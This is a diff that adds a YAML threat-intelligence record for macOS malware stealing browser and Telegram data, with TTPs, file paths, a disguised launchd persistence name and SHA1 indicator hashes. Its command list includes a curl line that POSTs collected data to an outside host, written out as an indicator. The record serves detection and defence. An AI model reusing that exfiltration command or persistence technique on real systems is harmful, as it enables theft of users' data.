@@ -1,0 +1,47 @@
+description: Malware targeting macOS browsers and Telegram data.
+malware_families:
+- keepcoder.Telegram
+TTPs:
+  commandline:
+  - /Users/h/Library/Application Support/Google LLC/Google LLC
+  - ps -axco comm
+  - 'curl --connect-timeout 30 --max-time 60 --no-buffer -X POST -H "Content-Type:
+    application/json" -d & quoted form of body & https://writeup.live/test'
+  - echo %mail_id% | xxd -r -p
+  scripting_engine:
+  - bash
+  - AppleScript
+  file_activity:
+  - /private/tmp/.config
+  - /Users/h/Library/Application Support/Google LLC/
+  - /Library/Application Support/Google LLC/
+  - /private/var/
+  persistence:
+  - launchd plist com.google.update
+IOCs:
+- 027d4020f2dd1eb473636bc112a84f0a90b6651c
+- 0602a5b8f089f957eeda51f81ac0f9ad4e336b87
+- 06566eabf54caafe36ebe94430d392b9cf3426ba
+- 08af4c21cd0a165695c756b6fda37016197b01e7
+- 16a6b0023ba3fde15bd0bba1b17a18bfa00a8f59
+- 1a5392102d57e9ea4dd33d3b7181d66b4d08d01d
+- 2c0177b302c4643c49dd7016530a4749298d964c
+- 2d746dda85805c79b5f6ea376f97d9b2f547da5d
+- 2ed2edec8ccc44292410042c730c190027b87930
+- 3168e996cb20bd7b4208d0864e962a4b70c5a0e7
+- 5b16e9d6e92be2124ba496bf82d38fb35681c7ad
+- 5b16e9d6e92be2124ba496bf82d38fb35681c7ad
+- 7c04225a62b953e1268653f637b569a3b2eb06f8
+- 945fcd3e08854a081c04c06eeb95ad6e0d9cdc19
+- a25c06e8545666d6d2a88c8da300cf3383149d5a
+- c9540dee9bdb28894332c5a74f696b4f94e4680c
+- e227e2e4a6ffb7280dfe7618be20514823d3e4f5
+- ee3795f6418fc0cacbe884a8eb803498c2b5776f
+- 023a15ac687e2d2e187d03e9976a89ef5f6c1617
+- bb72ca0e19a95c48a9ee4fd658958a0ae2af44b6
+authors:
+- Phil Stokes
+- Raffaele Sabato
+reference: https://www.sentinelone.com/labs/macos-nimdoor-dprk-threat-actors-target-web3-and-crypto-platforms-with-nim-based-malware/
+date_of_publication: July 02, 2025
+file_creation_date: July 07, 2025
